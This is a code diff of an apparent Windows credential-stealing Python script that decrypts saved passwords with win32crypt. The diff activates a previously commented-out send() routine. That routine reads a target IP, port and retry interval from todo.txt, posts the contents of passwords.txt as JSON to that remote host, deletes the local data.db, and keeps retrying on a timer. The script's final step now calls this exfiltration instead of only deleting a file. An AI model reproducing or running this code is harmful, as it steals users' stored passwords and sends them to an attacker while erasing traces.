@@ -10,36 +10,36 @@ import win32crypt
 import sys
 
 
-def delete_file(file):
+def delete_file():
     try:
-        os.remove(file)
+        os.remove("data.db")
         #os.remove("passwords.txt")
     except:
         pass
 
 
-#try:
-#    with open("todo.txt", "r") as f:
-#        lines = f.readlines()
-#        ip_address = lines[0].strip()
-#        interval = int(lines[1])
-#        port = lines[2]
-#        f.close()
-#except:
-#    pass
-#def send():
-#    try:
-#        with open("passwords.txt", "r") as f:
-#            payload = json.dumps({"content": f.read()})
-#            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
-#        delete_file()
-#        return
-#    except:
-#        try:
-#            timer = threading.Timer(interval, send)
-#            timer.start()
-#        except:
-#            return
+try:
+    with open("todo.txt", "r") as f:
+        lines = f.readlines()
+        ip_address = lines[0].strip()
+        interval = int(lines[1])
+        port = lines[2]
+        f.close()
+except:
+    pass
+def send():
+    try:
+        with open("passwords.txt", "r") as f:
+            payload = json.dumps({"content": f.read()})
+            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
+        delete_file()
+        return
+    except:
+        try:
+            timer = threading.Timer(interval, send)
+            timer.start()
+        except:
+            return
         
         
 def load_path(id):
@@ -131,7 +131,6 @@ def save_passwords(db_dir, key_dir):
 
     cursor.close()
     db.close()
-    delete_file(file)
-    #send()
+    send()
 
 save_passwords(load_path("db"), load_path("dir"))
